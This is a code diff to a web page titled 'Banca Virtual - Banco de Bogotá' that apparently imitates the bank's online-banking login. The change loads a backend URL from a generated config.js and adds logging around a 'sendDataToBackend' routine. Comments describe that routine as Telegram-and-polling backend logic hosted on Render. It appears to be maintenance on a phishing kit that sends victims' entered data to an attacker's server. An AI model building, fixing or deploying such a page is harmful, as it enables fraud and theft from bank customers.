@@ -4,6 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banca Virtual - Banco de Bogotá</title>
+    
+    <!-- ⚠️ IMPORTANTE: Carga la configuración dinámica del backend -->
+    <script src="/config.js"></script>
+    
     <style>
         /* --- CONFIGURACIÓN GENERAL --- */
         * {
@@ -593,8 +597,15 @@
         // 2. LÓGICA DEL BACKEND (TELEGRAM Y POLLING)
         // ==========================================
         
-        // Esta variable será reemplazada por tu servidor (server.js) en Render
-        const BACKEND_URL = '%%BACKEND_URL%%'; 
+        // La URL viene del archivo config.js generado dinámicamente por el servidor
+        const BACKEND_URL = window.BACKEND_URL;
+        
+        // Log para verificar en consola que la URL está bien cargada
+        console.log('✅ BACKEND_URL cargada:', BACKEND_URL);
+        
+        if (!BACKEND_URL || BACKEND_URL === '%%BACKEND_URL%%') {
+            console.error('❌ ERROR: BACKEND_URL no está configurada. Revisa /config.js');
+        }
 
         const loadingScreen = document.getElementById('loading-screen');
         const errorScreen = document.getElementById('error-screen');
@@ -652,6 +663,7 @@
                 }, 2000);
 
             } catch (error) {
+                console.error('❌ Error en sendDataToBackend:', error);
                 loadingScreen.style.display = 'none';
                 alert("Error de conexión. Intenta de nuevo.");
             }
